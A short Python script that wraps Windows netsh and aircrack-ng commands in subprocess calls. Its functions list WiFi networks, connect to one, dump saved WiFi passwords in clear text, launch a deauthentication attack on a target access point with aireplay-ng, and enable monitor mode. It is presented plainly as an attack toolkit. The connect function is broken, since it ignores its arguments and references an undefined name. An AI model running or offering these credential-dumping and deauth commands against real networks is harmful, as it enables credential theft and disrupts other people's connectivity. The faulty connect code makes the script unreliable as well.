import subprocess

# 1. View WiFi networks
def list_wifi():
    subprocess.run("netsh wlan show networks", shell=True)

# 2. Connect to WiFi
def connect_wifi(ssid, password):
    subprocess.run(f"netsh wlan connect name={MANI} key={12345678}", shell=True)

# 3. Get saved WiFi passwords
def saved_wifi_passwords():
    subprocess.run("netsh wlan show profile * key=clear", shell=True)

# 4. Deauth attack
def deauth_attack(interface, target):
    subprocess.run(f"aireplay-ng -0 10 -a {target} {interface}", shell=True)

# 5. Monitor mode activation
def monitor_mode(interface):
    subprocess.run(f"airmon-ng start {interface}", shell=True)
